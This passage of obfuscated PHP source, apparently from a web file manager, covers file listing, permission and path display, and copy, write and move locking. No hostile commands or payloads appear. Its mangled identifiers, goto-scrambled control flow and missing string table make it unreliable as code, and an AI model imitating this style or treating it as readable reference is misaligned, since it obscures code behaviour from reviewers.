$A«ÅÍéÉƒÀ = substr($A«ÅÍéÉƒÀ, 0, -strlen($Bàƒ°«ø‰á[445])); $dƒ™îÑ·±· = $this->query($A«ÅÍéÉƒÀ); $cÚ”îÚÛÊ‚ = array_merge($cÚ”îÚÛÊ‚, $dƒ™îÑ·±·); $A«ÅÍéÉƒÀ = $Bàƒ°«ø‰á[33]; } } $cÚ”îÚÛÊ‚ = array_to_keyvalue($cÚ”îÚÛÊ‚, $Bàƒ°«ø‰á[446]); goto Bçñ‡›Àß­; B’¤â¥áØ´: $b‚ÄŠ¾¸®á = 1024 * 50; $A¬ÃšÃÒÖ = is_array($A¬ÃšÃÒÖ) ? $A¬ÃšÃÒÖ : array(); $Féô²—çç… = count($A¬ÃšÃÒÖ); goto F±Ñœ™Í ; DÍ¼òƒÊ©’: $Bàƒ°«ø‰á =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $A«ÅÍéÉƒÀ = $Bàƒ°«ø‰á[358]; $cÚ”îÚÛÊ‚ = array(); goto B’¤â¥áØ´; Däæ™ÈÄç: } protected function _listAppendAuth(&$b´‘Ÿ–Å‰²) { goto E°‘¬ø§Ë; bÌÂÈ›ïï: $E‰—ğõ÷¸ = Model($eØ‰ò¡ÇŸ[450])->getSourceList($EâÎŒéµõƒ, $c¡†…º…¾); foreach ($b´‘Ÿ–Å‰² as $eÎË£ÏˆÚ„ => &$cÉñŒ˜Ë·) { $cÉñŒ˜Ë·[$eØ‰ò¡ÇŸ[373]] = $E‰—ğõ÷¸[$cÉñŒ˜Ë·[$eØ‰ò¡ÇŸ[366]]]; if (!$cÉñŒ˜Ë·[$eØ‰ò¡ÇŸ[373]] && $cÉñŒ˜Ë·[$eØ‰ò¡ÇŸ[368]] == self::TYPE_GROUP) { $cÉñŒ˜Ë·[$eØ‰ò¡ÇŸ[373]] = Action($eØ‰ò¡ÇŸ[451])->pathGroupAuthMake($cÉñŒ˜Ë·[$eØ‰ò¡ÇŸ[452]]); if (!$cÉñŒ˜Ë·[$eØ‰ò¡ÇŸ[373]] && !_get($GLOBALS, $eØ‰ò¡ÇŸ[453])) { $cÉñŒ˜Ë·[$eØ‰ò¡ÇŸ[186]] = !1; $cÉñŒ˜Ë·[$eØ‰ò¡ÇŸ[185]] = !1; } } if ($cÉñŒ˜Ë·[$eØ‰ò¡ÇŸ[373]]) { $cÉñŒ˜Ë·[$eØ‰ò¡ÇŸ[186]] = AuthModel::authCheckEdit($cÉñŒ˜Ë·[$eØ‰ò¡ÇŸ[373]][$eØ‰ò¡ÇŸ[374]]); $cÉñŒ˜Ë·[$eØ‰ò¡ÇŸ[185]] = AuthModel::authCheckView($cÉñŒ˜Ë·[$eØ‰ò¡ÇŸ[373]][$eØ‰ò¡ÇŸ[374]]); } $this->groupPathDisplay($cÉñŒ˜Ë·); } goto d˜›šš©Â¾; C¾„ÀãÚ†Í: foreach ($b´‘Ÿ–Å‰² as $cÉñŒ˜Ë·) { if ($cÉñŒ˜Ë·[$eØ‰ò¡ÇŸ[368]] == self::TYPE_GROUP) { $EâÎŒéµõƒ[] = $cÉñŒ˜Ë·[$eØ‰ò¡ÇŸ[366]]; } } if (!$EâÎŒéµõƒ) { return; } $c¡†…º…¾ = array_to_keyvalue($b´‘Ÿ–Å‰², $eØ‰ò¡ÇŸ[366]); goto bÌÂÈ›ïï; E°‘¬ø§Ë: $eØ‰ò¡ÇŸ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!defined($eØ‰ò¡ÇŸ[423])) { return; } $EâÎŒéµõƒ = array(); goto C¾„ÀãÚ†Í; d˜›šš©Â¾: } public function groupPathDisplay(&$c±îÃ¾Ö‰´) { goto dëÓ‚æµ†ˆ; f•ÜÜŞ—¾İ: $c±îÃ¾Ö‰´[$eîçï¸­š†[456]] = $Eùãßà£‹[$eîçï¸­š†[457]]; $c±îÃ¾Ö‰´[$eîçï¸­š†[377]] = $Eùãßà£‹[$eîçï¸­š†[455]]; $c±îÃ¾Ö‰´[$eîçï¸­š†[458]] = $Eùãßà£‹[$eîçï¸­š†[459]]; goto c¡³½²‚‹; c¡³½²‚‹: $c±îÃ¾Ö‰´[$eîçï¸­š†[460]] = $eÎº±à‹êó . $Eùãßà£‹[$eîçï¸­š†[388]][$eîçï¸­š†[366]]; goto aÄ‹‰·×Ë; E‹¦ß‚„Ì: $AÀ£¢¾‰¡ = $this->parentLevelArray($Eùãßà£‹[$eîçï¸­š†[455]]); $eÎº±à‹êó = $eîçï¸­š†[33]; foreach ($AÀ£¢¾‰¡ as $BÉ£ºå‰§†) { $fîÅ’­·ğ” = Model($eîçï¸­š†[454])->getInfo($BÉ£ºå‰§†); $eÎº±à‹êó .= $fîÅ’­·ğ”[$eîçï¸­š†[388]][$eîçï¸­š†[366]] . $eîçï¸­š†[47]; } goto f•ÜÜŞ—¾İ; dëÓ‚æµ†ˆ: $eîçï¸­š† =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($c±îÃ¾Ö‰´[$eîçï¸­š†[368]] != self::TYPE_GROUP) { return; } $Eùãßà£‹ = Model($eîçï¸­š†[454])->getInfo($c±îÃ¾Ö‰´[$eîçï¸­š†[452]]); goto E‹¦ß‚„Ì; aÄ‹‰·×Ë: } protected function _listAppendPath(&$aœ–òí—³) { goto fñ¦…™£©‰; d•– ™Æ”é: $e®’ïİ†¥” = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($aœ–òí—³ as &$D½¥ì¸º¥¼) { goto Fîˆ±¤í®÷; CŒ·²ğ: if ($bÖßÍˆ–¼£) { $Dïá¾‚êñ™ .= $D½¥ì¸º¥¼[$C¯‹½¼áæ²[28]]; } if ($D½¥ì¸º¥¼[$C¯‹½¼áæ²[367]]) { $Dïá¾‚êñ™ .= $C¯‹½¼áæ²[8]; } $D½¥ì¸º¥¼[$C¯‹½¼áæ²[462]] = str_replace($C¯‹½¼áæ²[463], $C¯‹½¼áæ²[8], $Dïá¾‚êñ™); goto E¯·ğòíæ; Fîˆ±¤í®÷: $bÖßÍˆ–¼£ = $this->parentLevelArray($D½¥ì¸º¥¼[$C¯‹½¼áæ²[455]]); $Dïá¾‚êñ™ = $this->_listAppendPathRoot($D½¥ì¸º¥¼, $bÖßÍˆ–¼£); foreach ($bÖßÍˆ–¼£ as $C¾ôŒÑ®Ğò) { if (isset($Föá©Ú„»[$C¾ôŒÑ®Ğò])) { $Dïá¾‚êñ™ .= $Föá©Ú„»[$C¾ôŒÑ®Ğò] . $C¯‹½¼áæ²[8]; } } goto CŒ·²ğ; E¯·ğòíæ: $fœ”²ò†­ = trim($D½¥ì¸º¥¼[$C¯‹½¼áæ²[462]], $C¯‹½¼áæ²[8]); if ($D½¥ì¸º¥¼[$C¯‹½¼áæ²[457]] == $C¯‹½¼áæ²[464] && $fœ”²ò†­) { $D½¥ì¸º¥¼[$C¯‹½¼áæ²[28]] = $fœ”²ò†­; } $this->_listAppendPathRecycle($D½¥ì¸º¥¼, $bÖßÍˆ–¼£, $e®’ïİ†¥”); goto DœõŠô™Ã; DœõŠô™Ã: } goto cõ¨‡˜Ş™Â; fñ¦…™£©‰: $C¯‹½¼áæ² =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Föá©Ú„» = array(); foreach ($aœ–òí—³ as &$D½¥ì¸º¥¼) { $Föá©Ú„»[$D½¥ì¸º¥¼[$C¯‹½¼áæ²[366]]] = $D½¥ì¸º¥¼[$C¯‹½¼áæ²[28]]; $bÖßÍˆ–¼£ = $this->parentLevelArray($D½¥ì¸º¥¼[$C¯‹½¼áæ²[455]]); array_shift($bÖßÍˆ–¼£); foreach ($bÖßÍˆ–¼£ as $C¾ôŒÑ®Ğò) { if (!isset($Föá©Ú„»[$C¾ôŒÑ®Ğò])) { $Föá©Ú„»[$C¾ôŒÑ®Ğò] = 0; } } } goto eƒ˜—ãá—; eƒ˜—ãá—: $D½ƒŞÅ´Áâ = array(); foreach ($Föá©Ú„» as $FšŒÆÈœŞç => $A‡Ù ĞÕ—) { if (!$A‡Ù ĞÕ—) { $D½ƒŞÅ´Áâ[] = $FšŒÆÈœŞç; } } if ($D½ƒŞÅ´Áâ) { $E”¾»”Ş¯ = array($C¯‹½¼áæ²[380] => array($C¯‹½¼áæ²[381], $D½ƒŞÅ´Áâ)); if (count($D½ƒŞÅ´Áâ) == 1) { $F¾ÙóÀÓ¤’ = $this->sourceInfo($D½ƒŞÅ´Áâ[0]); $F¾ÙóÀÓ¤’ = is_array($F¾ÙóÀÓ¤’) ? array($F¾ÙóÀÓ¤’) : !1; } else { $F¾ÙóÀÓ¤’ = $this->field($C¯‹½¼áæ²[461])->where($E”¾»”Ş¯)->select(); } $eÇ‘Œëó˜¥ = array_to_keyvalue($F¾ÙóÀÓ¤’, $C¯‹½¼áæ²[366], $C¯‹½¼áæ²[28]); $Föá©Ú„» = array_merge_index($Föá©Ú„», $eÇ‘Œëó˜¥); } goto d•– ™Æ”é; cõ¨‡˜Ş™Â: } private function _listAppendPathRecycle(&$dñ¬¥¥ÇÂ®, $AÌìÀœƒôİ, $D¼ĞŒ³Ø˜) { goto e‚ªŒ»èÌã; eÉ•å¿ôÄŒ: $d¤ä™Ç— = explode($F·äÕ°æš[8], trim($dñ¬¥¥ÇÂ®[$F·äÕ°æš[462]], $F·äÕ°æš[8])); $F­½ìÜêÚš = implode($F·äÕ°æš[8], array_slice($d¤ä™Ç—, 2)); $dñ¬¥¥ÇÂ®[$F·äÕ°æš[462]] = $F·äÕ°æš[8] . LNG($F·äÕ°æš[465]) . $F·äÕ°æš[8] . ltrim($F­½ìÜêÚš, $F·äÕ°æš[8]); goto D—ëåÒÁ’Ñ; e‚ªŒ»èÌã: $F·äÕ°æš =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (intval($dñ¬¥¥ÇÂ®[$F·äÕ°æš[368]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($D¼ĞŒ³Ø˜, $AÌìÀœƒôİ) && $dñ¬¥¥ÇÂ®[$F·äÕ°æš[366]] != $D¼ĞŒ³Ø˜) { return; } goto eÉ•å¿ôÄŒ; D—ëåÒÁ’Ñ: $dñ¬¥¥ÇÂ®[$F·äÕ°æš[455]] = $F·äÕ°æš[466] . implode($F·äÕ°æš[47], array_slice($AÌìÀœƒôİ, 1)) . $F·äÕ°æš[47]; if ($dñ¬¥¥ÇÂ®[$F·äÕ°æš[366]] == $D¼ĞŒ³Ø˜) { $dñ¬¥¥ÇÂ®[$F·äÕ°æš[455]] = $F·äÕ°æš[466]; $dñ¬¥¥ÇÂ®[$F·äÕ°æš[457]] = $F·äÕ°æš[464]; $dñ¬¥¥ÇÂ®[$F·äÕ°æš[28]] = LNG($F·äÕ°æš[465]); } $dñ¬¥¥ÇÂ®[$F·äÕ°æš[467]] = $F·äÕ°æš[468]; goto EÆä£âê£°; EÆä£âê£°: } protected function _listAppendPathRoot(&$D³Ê…‹«äš, $b¥Ë´ŞÃÕŠ) { $eÕÀ£¯ÕÅÈ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FÑĞñ¬ìµ² = $eÕÀ£¯ÕÅÈ[33]; if ($D³Ê…‹«äš[$eÕÀ£¯ÕÅÈ[368]] == self::TYPE_USER) { if (defined($eÕÀ£¯ÕÅÈ[423]) && $D³Ê…‹«äš[$eÕÀ£¯ÕÅÈ[452]] == USER_ID) { $FÑĞñ¬ìµ² = LNG($eÕÀ£¯ÕÅÈ[469]); if (!$b¥Ë´ŞÃÕŠ) { $D³Ê…‹«äš[$eÕÀ£¯ÕÅÈ[28]] = $FÑĞñ¬ìµ²; } } else { $Bã—»¢§Ã = Model($eÕÀ£¯ÕÅÈ[470])->getInfoSimple($D³Ê…‹«äš[$eÕÀ£¯ÕÅÈ[452]]); $FÑĞñ¬ìµ² = LNG($eÕÀ£¯ÕÅÈ[471]) . $eÕÀ£¯ÕÅÈ[154] . $Bã—»¢§Ã[$eÕÀ£¯ÕÅÈ[28]] . $eÕÀ£¯ÕÅÈ[472]; } } else { if ($D³Ê…‹«äš[$eÕÀ£¯ÕÅÈ[368]] == self::TYPE_GROUP) { $Bã—»¢§Ã = Model($eÕÀ£¯ÕÅÈ[454])->getInfoSimple($D³Ê…‹«äš[$eÕÀ£¯ÕÅÈ[452]]); $FÑĞñ¬ìµ² = $Bã—»¢§Ã[$eÕÀ£¯ÕÅÈ[28]]; } else { if ($D³Ê…‹«äš[$eÕÀ£¯ÕÅÈ[368]] == self::TYPE_SYSTEM) { $Bã—»¢§Ã = $this->sourceInfo($b¥Ë´ŞÃÕŠ[0], !0); $FÑĞñ¬ìµ² = $Bã—»¢§Ã[$eÕÀ£¯ÕÅÈ[28]]; } } } $FÑĞñ¬ìµ² = $FÑĞñ¬ìµ² ? $eÕÀ£¯ÕÅÈ[8] . $FÑĞñ¬ìµ² . $eÕÀ£¯ÕÅÈ[8] : $eÕÀ£¯ÕÅÈ[8]; return $FÑĞñ¬ìµ²; } protected function _listAppendUser(&$BÎ´Ä£Ğ§ƒ) { $cíê‹ê»Â =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $aÊßİïÚÙº = array_to_keyvalue($BÎ´Ä£Ğ§ƒ, $cíê‹ê»Â[33], $cíê‹ê»Â[375]); $CÈ ©Á˜ = array_to_keyvalue($BÎ´Ä£Ğ§ƒ, $cíê‹ê»Â[33], $cíê‹ê»Â[376]); $BÅ¿Ùä‰èø = array_merge($aÊßİïÚÙº, $CÈ ©Á˜); $có¢©‹îİ‹ = Model($cíê‹ê»Â[473])->userListInfo($BÅ¿Ùä‰èø); foreach ($BÎ´Ä£Ğ§ƒ as &$cëˆ‡êªãò) { $EÏÂ‡ôäÕŠ = $cëˆ‡êªãò[$cíê‹ê»Â[375]]; $cëˆ‡êªãò[$cíê‹ê»Â[375]] = $có¢©‹îİ‹[$EÏÂ‡ôäÕŠ] ? $có¢©‹îİ‹[$EÏÂ‡ôäÕŠ] : !1; $EÏÂ‡ôäÕŠ = $cëˆ‡êªãò[$cíê‹ê»Â[376]]; $cëˆ‡êªãò[$cíê‹ê»Â[376]] = $có¢©‹îİ‹[$EÏÂ‡ôäÕŠ] ? $có¢©‹îİ‹[$EÏÂ‡ôäÕŠ] : !1; if (isset($cëˆ‡êªãò[$cíê‹ê»Â[413]]) && $cëˆ‡êªãò[$cíê‹ê»Â[413]][$cíê‹ê»Â[474]]) { $B¾¥¹òºïÍ = $GLOBALS[$cíê‹ê»Â[6]][$cíê‹ê»Â[84]][$cíê‹ê»Â[475]]; if ($cëˆ‡êªãò[$cíê‹ê»Â[413]][$cíê‹ê»Â[476]] <= time() - $B¾¥¹òºïÍ) { $this->metaSet($cëˆ‡êªãò[$cíê‹ê»Â[366]], $cíê‹ê»Â[474], null); $this->metaSet($cëˆ‡êªãò[$cíê‹ê»Â[366]], $cíê‹ê»Â[476], null); unset($cëˆ‡êªãò[$cíê‹ê»Â[413]][$cíê‹ê»Â[474]]); continue; } $BÓÑó¢ˆë = $cëˆ‡êªãò[$cíê‹ê»Â[413]][$cíê‹ê»Â[474]]; $cëˆ‡êªãò[$cíê‹ê»Â[413]][$cíê‹ê»Â[477]] = Model($cíê‹ê»Â[473])->getInfoSimpleOuter($BÓÑó¢ˆë); } } } public function parentLevelArray($AÜ¬š‚ƒŠ) { $C¤ÜÀÏ’‹¶ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AÜ¬š‚ƒŠ = explode($C¤ÜÀÏ’‹¶[47], trim($AÜ¬š‚ƒŠ, $C¤ÜÀÏ’‹¶[47])); return array_remove_value($AÜ¬š‚ƒŠ, $C¤ÜÀÏ’‹¶[464]); } public function listAll($FÚÑÖË¢Ìé) { goto E£¢·Ê¦°; BÓÊ¿àçÈğ: $aëÈ—† = $Cõ®¬Ğ¡àÄ[482]; $DÁùÀ³ßÎ = "\114\x45\106\124\40\x4a\117\x49\x4e\40{$this->tablePrefix}\x69\157\137\x66\151\x6c\145\x20\x66\x69\154\145\40\157\156\40\x73\x6f\x75\162\143\145\x2e\x66\151\x6c\145\111\104\40\75\x20\x66\x69\x6c\145\56\x66\151\154\145\x49\x44"; $fÚÈŒ—£Š· = $this->alias($Cõ®¬Ğ¡àÄ[483])->field($aëÈ—†)->where($d‡º«‡”Ş±)->join($DÁùÀ³ßÎ)->select(); goto B‡¿„µœ–; ağÚ’±›: $FÄÕ‘¨ö¼” = array(); foreach ($fÚÈŒ—£Š· as $FÂÇ”’°ô => $bé‰¾Ößºö) { goto fî²Šæ°†²; D®Ïµ”•Ñ°: if (!$bé‰¾Ößºö[$Cõ®¬Ğ¡àÄ[367]]) { $f²«–óøÓÚ[$Cõ®¬Ğ¡àÄ[415]] = $bé‰¾Ößºö[$Cõ®¬Ğ¡àÄ[415]]; $f²«–óøÓÚ[$Cõ®¬Ğ¡àÄ[485]] = $bé‰¾Ößºö[$Cõ®¬Ğ¡àÄ[75]]; } $FÄÕ‘¨ö¼”[] = $f²«–óøÓÚ; goto E®ˆƒ¦¹Éø; fî²Šæ°†²: $E÷‰¤Êù½ = $this->parentLevelArray($bé‰¾Ößºö[$Cõ®¬Ğ¡àÄ[455]]); array_shift($E÷‰¤Êù½); $E’â‹ÍŠ = $cªØ–‹ñ¿; goto fíÅÁâ¡È‡; cô§ãÏäº: $E’â‹ÍŠ = str_replace($Cõ®¬Ğ¡àÄ[463], $Cõ®¬Ğ¡àÄ[8], $E’â‹ÍŠ); $E’â‹ÍŠ = str_replace($Cõ®¬Ğ¡àÄ[463], $Cõ®¬Ğ¡àÄ[8], $E’â‹ÍŠ); $f²«–óøÓÚ = array($Cõ®¬Ğ¡àÄ[384] => str_replace($Cõ®¬Ğ¡àÄ[463], $Cõ®¬Ğ¡àÄ[8], $E’â‹ÍŠ), $Cõ®¬Ğ¡àÄ[484] => intval($bé‰¾Ößºö[$Cõ®¬Ğ¡àÄ[367]]), $Cõ®¬Ğ¡àÄ[388] => $this->pathInfoFilter($bé‰¾Ößºö, !0)); goto D®Ïµ”•Ñ°; fíÅÁâ¡È‡: for ($aèÙŒíº•Í = 0; $aèÙŒíº•Í < count($E÷‰¤Êù½); $aèÙŒíº•Í++) { $E’â‹ÍŠ .= $fÚÈŒ—£Š·[$E÷‰¤Êù½[$aèÙŒíº•Í]][$Cõ®¬Ğ¡àÄ[28]] . $Cõ®¬Ğ¡àÄ[8]; } $E’â‹ÍŠ .= $bé‰¾Ößºö[$Cõ®¬Ğ¡àÄ[28]]; if ($bé‰¾Ößºö[$Cõ®¬Ğ¡àÄ[367]]) { $E’â‹ÍŠ .= $Cõ®¬Ğ¡àÄ[8]; } goto cô§ãÏäº; E®ˆƒ¦¹Éø: } return $FÄÕ‘¨ö¼”; goto CÛË×…ÙÔ±; B‡¿„µœ–: $this->_listAppendAuth($fÚÈŒ—£Š·); $this->_listAppendUser($fÚÈŒ—£Š·); $this->_listAppendPath($fÚÈŒ—£Š·); goto b¸©á¦¥Â; E£¢·Ê¦°: $Cõ®¬Ğ¡àÄ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $dÉß†Ğöğ“ = $this->sourceInfo($FÚÑÖË¢Ìé); $d‡º«‡”Ş± = array($Cõ®¬Ğ¡àÄ[478] => array($Cõ®¬Ğ¡àÄ[479], $dÉß†Ğöğ“[$Cõ®¬Ğ¡àÄ[455]] . $FÚÑÖË¢Ìé . $Cõ®¬Ğ¡àÄ[480]), $Cõ®¬Ğ¡àÄ[481] => 0); goto BÓÊ¿àçÈğ; b¸©á¦¥Â: $fÚÈŒ—£Š· = array_to_keyvalue($fÚÈŒ—£Š·, $Cõ®¬Ğ¡àÄ[366]); $cªØ–‹ñ¿ = "\x2f{$dÉß†Ğöğ“[$Cõ®¬Ğ¡àÄ[28]]}\57"; $cªØ–‹ñ¿ = $cªØ–‹ñ¿ == $Cõ®¬Ğ¡àÄ[463] ? $Cõ®¬Ğ¡àÄ[8] : $cªØ–‹ñ¿; goto ağÚ’±›; CÛË×…ÙÔ±: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($eù½ÂˆîÒ) { goto d¯Ø•Ç‰ï; d¯Ø•Ç‰ï: $Cåæ¯ã§±½ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Cåæ¯ã§±½[486], $eù½ÂˆîÒ); goto c²éùç¨¢â; c²éùç¨¢â: $a§â¥„—“ = 1; $this->_lockEvent($eù½ÂˆîÒ, array($Cåæ¯ã§±½[487], $Cåæ¯ã§±½[488]), $a§â¥„—“); $this->_lockParent($eù½ÂˆîÒ, array($Cåæ¯ã§±½[488]), $a§â¥„—“); goto E‚Ñ’ÊÂ¿…; E‚Ñ’ÊÂ¿…: $this->_lockEvent($eù½ÂˆîÒ, array($Cåæ¯ã§±½[489], $Cåæ¯ã§±½[490]), $a§â¥„—“); $this->_lockCheckEnd($Cåæ¯ã§±½[486], $eù½ÂˆîÒ); goto cÜ³½ô¦áÙ; cÜ³½ô¦áÙ: } public function lockCopyEnd($B¢®Òò¦ã…) { $BĞï¢—¸õ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$this->allowLock()) { return; } $c«¶™¦”Íâ = 0; $this->_lockEvent($B¢®Òò¦ã…, array($BĞï¢—¸õ[487], $BĞï¢—¸õ[488]), $c«¶™¦”Íâ); $this->_lockParent($B¢®Òò¦ã…, array($BĞï¢—¸õ[488]), $c«¶™¦”Íâ); $this->_lockEvent($B¢®Òò¦ã…, array($BĞï¢—¸õ[489], $BĞï¢—¸õ[490]), $c«¶™¦”Íâ); } public function lockWriteStart($DÌ©ƒÌ¶Ó, $B½ŸèÆƒ‰À = '') { goto C¬Ï…øªŞ°; CŸ‰ƒÏ«‹Õ: $C¨®ƒÌµî± = 1; $this->_lockKey($f‡¿½ŞÔÌğ[491] . $DÌ©ƒÌ¶Ó . $f‡¿½ŞÔÌğ[93] . $B½ŸèÆƒ‰À, $C¨®ƒÌµî±); $this->_lockEvent($DÌ©ƒÌ¶Ó, array($f‡¿½ŞÔÌğ[486], $f‡¿½ŞÔÌğ[488]), $C¨®ƒÌµî±); goto d¤äàñŠñ¯; C¬Ï…øªŞ°: $f‡¿½ŞÔÌğ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$this->allowLock()) { return; } $this->_lockCheck($f‡¿½ŞÔÌğ[487], $DÌ©ƒÌ¶Ó); goto CŸ‰ƒÏ«‹Õ; d¤äàñŠñ¯: $this->_lockParent($DÌ©ƒÌ¶Ó, array($f‡¿½ŞÔÌğ[486], $f‡¿½ŞÔÌğ[488]), $C¨®ƒÌµî±); $this->_lockCheckEnd($f‡¿½ŞÔÌğ[487], $DÌ©ƒÌ¶Ó); goto a‘…ºğ½õ; a‘…ºğ½õ: } public function lockWriteEnd($FãÇà¡¬§ñ, $eØ»˜Æ»” = '') { $AŸß«ÕÒÑ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$this->allowLock()) { return; } $D ˜‚Ñç„„ = 0; $this->_lockKey($AŸß«ÕÒÑ[491] . $FãÇà¡¬§ñ . $AŸß«ÕÒÑ[93] . $eØ»˜Æ»”, $D ˜‚Ñç„„); $this->_lockEvent($FãÇà¡¬§ñ, array($AŸß«ÕÒÑ[486], $AŸß«ÕÒÑ[488]), $D ˜‚Ñç„„); $this->_lockParent($FãÇà¡¬§ñ, array($AŸß«ÕÒÑ[486], $AŸß«ÕÒÑ[488]), $D ˜‚Ñç„„); } public function lockMoveStart($cºƒ¡œŸ‡) { goto Cª™£Ø÷é; Aãö²ìÇ: $D”ˆÌÍ…—æ = 1; $this->_lockKey($E‹ïÊŠÀö[492] . $cºƒ¡œŸ‡, $D”ˆÌÍ…—æ); $this->_lockEvent($cºƒ¡œŸ‡, array($E‹ïÊŠÀö[486], $E‹ïÊŠÀö[487]), $D”ˆÌÍ…—æ); goto aÃ Ñ¾ŠÖğ; aÃ Ñ¾ŠÖğ: $this->_lockParent($cºƒ¡œŸ‡, array($E‹ïÊŠÀö[486], $E‹ïÊŠÀö[488]), $D”ˆÌÍ…—æ); $this->_lockEvent($cºƒ¡œŸ‡, array($E‹ïÊŠÀö[493], $E‹ïÊŠÀö[489], $E‹ïÊŠÀö[490]), $D”ˆÌÍ…—æ); $this->_lockCheckEnd($E‹ïÊŠÀö[488], $cºƒ¡œŸ‡); goto DÃâ©äçÍ¯; Cª™£Ø÷é: $E‹ïÊŠÀö =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$this->allowLock()) { return; } $this->_lockCheck($E‹ïÊŠÀö[488], $cºƒ¡œŸ‡); goto Aãö²ìÇ; DÃâ©äçÍ¯: } public function lockMoveEnd($cáô¢™‚—Ú) { goto CÓø’Şœ™‰; a…½Êä®ì•: $this->_lockEvent($cáô¢™‚—Ú, array($A„â›—¤‡¯[493], $A„â›—¤‡¯[489], $A„â›—¤‡¯[490]), $eËßƒ„¯õ ); goto A˜ËËî–„Ù; e Ï±İÓ¹°: $this->_lockKey($A„â›—¤‡¯[492] . $cáô¢™‚—Ú, $eËßƒ„¯õ ); $this->_lockEvent($cáô¢™‚—Ú, array($A„â›—¤‡¯[486], $A„â›—¤‡¯[487]), $eËßƒ„¯õ ); $this->_lockParent($cáô¢™‚—Ú, array($A„â›—¤‡¯[486], $A„â›—¤‡¯[488]), $eËßƒ„¯õ ); goto a…½Êä®ì•; CÓø’Şœ™‰: $A„â›—¤‡¯ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$this->allowLock()) { return; } $eËßƒ„¯õ  = 0; goto e Ï±İÓ¹°; A˜ËËî–„Ù: } private function _lockCheck($DÊ¤Ûíğàë, $AÈäŒ„ÑåÁ) { goto Eæ¥áˆ¾¿·; B”ÀíãÒ: $e£Ìİ©Ö™Ï = array_reverse($this->parentLevelArray($d‰ßÌò ‡[$dÂ…¹Èí”é[455]])); foreach ($e£Ìİ©Ö™Ï as $Aì‘ŞÛì˜Î) { $C„ˆœÕøô = $DÊ¤Ûíğàë . $dÂ…¹Èí”é[495] . $Aì‘ŞÛì˜Î; if (CacheLock::lockGet($dÂ…¹Èí”é[496] . $C„ˆœÕøô)) { $d‰ßÌò ‡ = $this->sourceInfo($Aì‘ŞÛì˜Î); CacheLock::setErrorMsg($dÂ…¹Èí”é[154] . htmlspecialchars($d‰ßÌò ‡[$dÂ…¹Èí”é[28]]) . $dÂ…¹Èí”é[472] . $A‘ˆ‚ºåùÀ); $this->_lockKey($C„ˆœÕøô, 1); $this->_lockKey($C„ˆœÕøô, 0); } } goto E¿åÍìî—¬; Eéöö‰¦ÆÑ: CacheLock::setErrorMsg($dÂ…¹Èí”é[154] . htmlspecialchars($d‰ßÌò ‡[$dÂ…¹Èí”é[28]]) . $dÂ…¹Èí”é[472] . $A‘ˆ‚ºåùÀ); $this->_lockKey($C„ˆœÕøô, 1); $this->_lockKey($C„ˆœÕøô, 0); goto B”ÀíãÒ; Eæ¥áˆ¾¿·: $dÂ…¹Èí”é =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $d‰ßÌò ‡ = $this->sourceInfo($AÈäŒ„ÑåÁ); $C„ˆœÕøô = $DÊ¤Ûíğàë . $dÂ…¹Èí”é[93] . $AÈäŒ„ÑåÁ; goto eğÙÏÆôî; eğÙÏÆôî: $this->_lockTimeStart[$C„ˆœÕøô] = timeFloat(); if (!is_array($d‰ßÌò ‡)) { return; } $A‘ˆ‚ºåùÀ = LNG($dÂ…¹Èí”é[494]); goto Eéöö‰¦ÆÑ; E¿åÍìî—¬: } private function _lockCheckEnd($aù‡¡ñ‰¢‘, $a†¨ƒ¨ÊÉË) { goto fÏêÌÒ†„î; b¯Ò³´¿‡Â: if (!isset($this->_lockTimeStart[$EÇ²•­¯•Ç])) { return; } $F¶ó‘­ª´õ = timeFloat() - $this->_lockTimeStart[$EÇ²•­¯•Ç]; unset($this->_lockTimeStart[$EÇ²•­¯•Ç]); goto dÆôÓÏ¶‹ß; fÏêÌÒ†„î: $Cº«…Àé— =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EÇ²•­¯•Ç = $aù‡¡ñ‰¢‘ . $Cº«…Àé—[93] . $a†¨ƒ¨ÊÉË; CacheLock::setErrorMsg($Cº«…Àé—[358]); goto b¯Ò³´¿‡Â; dÆôÓÏ¶‹ß: if ($F¶ó‘­ª´õ > 0.5) { unset(self::$cacheSourceInfo[$Cº«…Àé—[406] . $a†¨ƒ¨ÊÉË]); } $dï‰Áèö›• = $this->sourceInfo($a†¨ƒ¨ÊÉË); if (!$dï‰Áèö›•) { show_json(LNG($Cº«…Àé—[102]), !1); } goto e†²‡’è”®; e†²‡’è”®: } private function _lockParent($C©¯¨Æ·¦á, $Aí‘Ûî±, $Dò˜š’Œ×) { if (!$this->autoLockSet) { return; } $dÅ‡†˜¨ƒŒ = $this->sourceInfo($C©¯¨Æ·¦á); if (!is_array($dÅ‡†˜¨ƒŒ)) { return; } $b£Şƒùî±â = array_reverse($this->parentLevelArray($dÅ‡†˜¨ƒŒ[$_SERVER[ÚŠ•´ÍéÒÑÔ][455]])); foreach ($b£Şƒùî±â as $Ağ¡Õ×‹ÉÅ) { $this->_lockEvent($Ağ¡Õ×‹ÉÅ, $Aí‘Ûî±, $Dò˜š’Œ×); } } private function _lockEvent($dÛ™çà, $F‚õßèÃØ², $Aæì«âñïŒ) { $bÎˆÅÍá÷ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$this->autoLockSet) { return; } foreach ($F‚õßèÃØ² as $c·¿—†äš) { $F•´ŒÚÚº— = $c·¿—†äš . $bÎˆÅÍá÷[93] . $dÛ™çà; if ($Aæì«âñïŒ && 